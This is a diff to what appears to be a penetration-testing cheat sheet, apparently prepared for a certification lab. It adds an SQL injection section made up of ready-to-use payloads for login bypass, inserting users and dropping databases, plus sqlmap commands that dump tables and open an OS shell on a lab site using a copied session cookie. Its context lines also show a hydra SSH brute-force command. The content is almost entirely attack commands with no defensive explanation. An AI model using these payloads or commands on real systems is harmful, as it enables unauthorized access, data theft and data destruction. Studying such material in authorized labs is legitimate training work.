@@ -193,7 +193,42 @@ ftp://IP-Address/folder
 hydra -L userlist.txt -P passwordlist.txt IP-Address ssh -V
 ```
 
-## SQL
+## SQL injection
+#### Login bypass
+```bash
+blah' or 1=1 --
+```
+#### Add new user
+```bash
+blah';insert into login values ('john','apple123'); -- 
+```
+#### Create new database
+```bash
+blah';create database mydatabase; --
+```
+#### Drop database
+```bash
+blah'; DROP DATABASE mydatabase; -- 
+```
+
+#### SQLmap
+#####Inspect page, in the console page, type document.cookie in the lower-left corner of the browser, and press Enter. Select the cookie value, then right-click and copy it
+#### Check databases
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs 
+```
+#### See tables of database
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D <database> --tables
+```
+#### Dump table from database
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D <database> -T <table> --dump
+```
+#### Get shell
+```bash
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --os-shell
+```
 
 dsss.py
 
